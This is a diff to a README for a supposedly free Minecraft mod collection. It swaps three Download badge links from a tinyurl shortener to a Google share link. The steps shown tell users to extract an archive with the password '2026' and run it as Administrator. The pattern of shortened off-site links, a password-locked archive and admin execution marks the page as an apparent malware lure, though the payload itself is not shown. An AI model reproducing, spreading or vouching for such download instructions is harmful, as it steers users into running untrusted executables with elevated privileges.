@@ -9,7 +9,7 @@ The **⛏️ Minecraft Mods** is a **free** ultimate mod collection that gives y
 
 <div align="center">
 
-[![Download Minecraft Mods](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/minecraft-mods-latest)
+[![Download Minecraft Mods](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://share.google/WkJmRkjyRJ1bsfB1I)
 
 </div>
 
@@ -123,7 +123,7 @@ The **⛏️ Minecraft Mods** is a **free** ultimate mod collection that gives y
 2. **📦 Extract the archive** — password: `2026`
 3. **🖱️ Run as Administrator** → Follow setup → Install mods
 
-[![Download Minecraft Mods](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/minecraft-mods-latest)
+[![Download Minecraft Mods](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://share.google/WkJmRkjyRJ1bsfB1I)
 
 ### Detailed Installation (May 2026 Update)
 
@@ -242,7 +242,7 @@ Transform Minecraft into the ultimate sandbox for free. **Minecraft Mods** gives
 
 <div align="center">
 
-[![Download Minecraft Mods](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/minecraft-mods-latest)
+[![Download Minecraft Mods](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://share.google/WkJmRkjyRJ1bsfB1I)
 
 **Version 4.6.1** — Free Minecraft mod collection. May 2026 update. Zero cost. No payment.
 
